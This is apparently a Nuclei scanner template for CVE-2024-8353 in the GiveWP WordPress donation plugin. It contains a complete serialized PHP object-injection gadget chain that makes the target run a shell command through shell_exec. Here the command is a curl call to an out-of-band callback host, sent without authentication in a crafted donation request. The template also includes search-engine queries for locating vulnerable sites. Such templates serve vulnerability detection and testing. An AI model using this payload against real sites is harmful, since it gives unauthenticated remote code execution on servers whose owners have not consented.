id: CVE-2024-8353

info:
  name: GiveWP - PHP Object Injection via give_title and card_address
  author: bryanwills
  severity: critical
  description: |
    GiveWP â€“ Donation Plugin and Fundraising Platform for WordPress contains a PHP Object Injection
    caused by deserialization of untrusted input via parameters like 'give_title' and 'card_address',
    letting unauthenticated attackers inject PHP objects and potentially delete files or execute code.
  impact: |
    This vulnerability allows unauthenticated attackers to inject PHP objects through the 'give_title'
    and 'card_address' parameters. Successful exploitation can lead to arbitrary file deletion or
    remote code execution depending on available POP chains.
  remediation: |
    Update to GiveWP version 3.16.2 or later to mitigate this vulnerability.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-8353
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/wp_givewp_rce.rb
    - https://vulncheck.com/xdb/2d719a4f5a4d
    - https://github.com/EQSTLab/CVE-2024-8353
    - https://github.com/0xb0mb3r/CVE-2024-8353-PoC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-8353
    cwe-id: CWE-502
    epss-score: 0.94018
    epss-percentile: 0.99888
    cpe: cpe:2.3:a:givewp:givewp:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: givewp
    product: givewp
    framework: wordpress
    publicwww-query: "/wp-content/plugins/give/"
    shodan-query: 'http.html:"/wp-content/plugins/give/"'
  tags: cve,cve2024,rce,wp,wp-plugin,wordpress,oast,givewp,php-object-injection,kev

flow: http(1) && http(2)

variables:
  oast: "{{interactsh-url}}"
  len_payload: "{{ len(oast) + 5 }}"
  # PHP Object Injection payload targeting give_title parameter
  payload_give_title: 'O:19:"Stripe\\\\StripeObject":1:{s:7:"_values";a:1:{i:0;O:62:"Give\\\\PaymentGateways\\\\DataTransferObjects\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:9:"container";O:33:"Give\\\\Vendors\\\\Faker\\\\ValidGenerator":3:{s:9:"generator";O:24:"Give\\\\Container\\\\Container":1:{s:9:"instances";a:1:{s:8:"address1";s:{{len_payload}}:"curl {{oast}}";}}s:10:"maxRetries";i:1;s:9:"validator";s:10:"shell_exec";}}}}}}'
  # PHP Object Injection payload targeting card_address parameter
  payload_card_address: 'O:19:"Stripe\\\\StripeObject":1:{s:7:"_values";a:1:{i:0;O:62:"Give\\\\PaymentGateways\\\\DataTransferObjects\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:9:"container";O:33:"Give\\\\Vendors\\\\Faker\\\\ValidGenerator":3:{s:9:"generator";O:24:"Give\\\\Container\\\\Container":1:{s:9:"instances";a:1:{s:8:"address1";s:{{len_payload}}:"curl {{oast}}";}}s:10:"maxRetries";i:1;s:9:"validator";s:10:"shell_exec";}}}}}}'
  email: "{{to_lower(rand_text_alpha(8))}}@gmail.com"
  firstname: "{{to_lower(rand_text_alpha(5))}}"
  lastname: "{{to_lower(rand_text_alpha(5))}}"

http:
  - raw:
      - |
        GET /wp-json/wp/v2/give_forms/ HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - '"type":'
          - '"guid":'
        condition: and
        internal: true

    extractors:
      - type: json
        part: body
        name: value
        internal: true
        json:
          - '.[0].slug'

      - type: json
        part: body
        name: give-form-title
        internal: true
        json:
          - '.[0].title.rendered'

      - type: json
        part: body
        name: links
        internal: true
        json:
          - '.[0].link'

  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        give-honeypot=&give-form-id-prefix=1&give-form-id=1&give-form-title={{give-form-title}}&give-current-url={{links}}&give-form-url={{RootURL}}&give-form-minimum=10&give-form-maximum=1000000&give-form-hash=test&give-price-id=custom&give-amount=10&give_first={{firstname}}&give_last={{lastname}}&give_email={{email}}&give_stripe_payment_method=&give-user-id=1&give_action=purchase&give-gateway=manual&give_embed_form=1&action=give_process_donation&give_title={{payload_give_title}}&card_address={{payload_card_address}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        part: body
        words:
          - '"error_data"'
          - '"unknown_error"'
        condition: and
